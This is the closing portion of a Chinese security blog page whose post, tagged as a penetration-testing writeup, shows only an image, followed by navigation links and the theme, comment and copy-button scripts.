<p><img alt="image-20250409225723235" loading="lazy" src="../assets/image-20250409225723235.png"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
      <li><a href="http://localhost:1313/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/xyctf_2025/">
    <span class="title">« 上一页</span>
    <br>
    <span>XYCTF-2025-Web-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/">
    <span class="title">下一页 »</span>
    <br>
    <span>春秋云镜-Time-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
